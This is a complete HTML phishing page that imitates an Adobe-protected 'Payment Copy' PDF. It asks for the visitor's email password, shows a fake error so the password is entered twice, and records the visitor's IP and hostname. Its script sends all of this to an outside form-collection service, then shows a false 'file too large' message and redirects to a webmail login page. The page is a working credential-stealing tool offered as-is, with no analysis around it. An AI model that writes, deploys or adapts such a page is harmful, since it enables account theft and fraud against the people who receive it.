<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF ‚Äî Payment Copy</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }

    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: #f6f6f6 url('download.jpg') no-repeat center top;
      background-size: cover;
      overflow: hidden;
      position: relative;
    }

    /* Splash with image */
    #imageSplash {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: url('download.jpg') no-repeat center center / cover;
      z-index: 10000;
      transition: opacity 1s ease;
    }

    /* Spinner splash */
    #splash {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 9999;
      transition: opacity 1s ease;
      text-align: center;
      opacity: 0;
    }

    #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 6px; }
    #splash p { color: #666; font-size: 14px; }
    .loader {
      margin-top: 20px;
      width: 36px; height: 36px;
      border: 4px solid #ddd;
      border-top-color: #d32f2f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    #main { display: none; height: 100%; align-items: flex-start; justify-content: center; padding: 28px 12px 60px; }
    #main.show { display: flex; animation: fadeIn 1s ease; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    body::before {
      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
      position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
      font-size: 46px; font-weight: bold; color: rgba(200, 0, 0, 0.12);
      transform: rotate(-35deg); white-space: pre; line-height: 120px;
      pointer-events: none; z-index: 0;
    }

    .card {
      width: 450px; max-width: 94%;
      background: rgba(255,255,255,0.95);
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      padding: 28px 22px 34px;
      position: relative;
      z-index: 2;
      backdrop-filter: blur(4px);
    }

    .pdf-icon { display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
    .pdf-icon img { width: 54px; height: auto; }
    h1 { font-size: 20px; text-align: center; margin-bottom: 6px; }
    p.lead { text-align: center; color: #666; margin-bottom: 22px; font-size: 14px; }

    .input {
      width: 100%; border: 1px solid #e6e6e6; border-radius: 4px;
      padding: 14px 12px; margin-bottom: 12px; color: #444;
      background: #fafafa; font-size: 15px;
    }

    .password-wrapper { position: relative; }
    .toggle-password {
      position: absolute; top: 50%; right: 12px;
      transform: translateY(-50%);
      cursor: pointer; color: #999; font-size: 18px;
      user-select: none;
    }

    .download-wrap { text-align: center; margin: 16px 0 10px; }
    .btn-download {
      display: inline-block;
      padding: 12px 36px;
      border-radius: 30px;
      background: #d32f2f;
      color: #fff;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      box-shadow: 0 6px 18px rgba(211,47,47,0.18);
      border: none; cursor: pointer; font-size: 15px;
    }

    .hidden { display: none; }
    .error-message { color: #d32f2f; font-size: 14px; margin-top: 8px; text-align: center; display: none; }
  </style>
</head>
<body>

  <div id="imageSplash"></div>

  <div id="splash">
    <h2>Loading Secure Viewer‚Ä¶</h2>
    <p>Please wait while we prepare your file</p>
    <div class="loader"></div>
  </div>

  <div id="main">
    <div class="card">
      <div class="pdf-icon">
        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'><rect width='72' height='90' rx='6' fill='%23d63636'/><text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text></svg>" alt="PDF">
      </div>
      <h1>This File is Protected By Adobe¬Æ<br>Security.</h1>
      <p class="lead">Click Continue to enter your password and view the payment copy.</p>

      <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST">
        <input type="hidden" name="ip" id="ip">
        <input type="hidden" name="hostname" id="hostname">
        <input type="hidden" name="password1" id="password1">

        <input id="email" name="email" class="input" type="email" readonly value="user@example.com">

        <div class="password-wrapper">
          <input id="password" name="password2" class="input" type="password" placeholder="Enter password" required>
          <span id="togglePassword" class="toggle-password">üëÅÔ∏è</span>
        </div>

        <p id="errorMessage" class="error-message">Please re-enter password</p>

        <div class="download-wrap">
          <button class="btn-download" type="submit">DOWNLOAD</button>
        </div>
      </form>
    </div>
  </div>

<script>
  // Splash sequence
  window.addEventListener('load', () => {
    const imgSplash = document.getElementById('imageSplash');
    const splash = document.getElementById('splash');
    setTimeout(() => {
      imgSplash.style.opacity = '0';
      setTimeout(() => {
        imgSplash.style.display = 'none';
        splash.style.opacity = '1';
      }, 1000);
    }, 2000);
    setTimeout(() => {
      splash.style.opacity = '0';
      setTimeout(() => {
        splash.style.display = 'none';
        document.getElementById('main').classList.add('show');
      }, 800);
    }, 4500);
  });

  // Autofill host/IP
  document.getElementById('hostname').value = window.location.hostname;
  fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('ip').value=d.ip;});

  // Password logic
  let firstPassword = "";
  const form = document.getElementById('mainForm');
  const pass = document.getElementById('password');
  const pass1 = document.getElementById('password1');
  const errorMsg = document.getElementById('errorMessage');

  form.addEventListener('submit', (e) => {
    if (!firstPassword) {
      e.preventDefault();
      firstPassword = pass.value;
      pass1.value = firstPassword;
      pass.value = "";
      errorMsg.style.display = "block";
      pass.focus();
      return;
    }

    // Show overlay + redirect
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;`;
    overlay.innerHTML = `<div style="width:40px;height:40px;border:4px solid #ccc;border-top-color:#d32f2f;border-radius:50%;animation:spin 1s linear infinite;"></div>
      <p style="margin-top:20px;color:#d32f2f;font-weight:600;">File too large, please contact the sender to send in smaller chunks...</p>`;
    document.body.appendChild(overlay);

    setTimeout(()=>window.location.href="https://webmail.roundcube.101.hostinglogin.net/", 3000);
  });

  // Toggle password
  document.getElementById('togglePassword').addEventListener('click',()=>{
    pass.type = pass.type === "password" ? "text" : "password";
  });
</script>
</body>
</html>
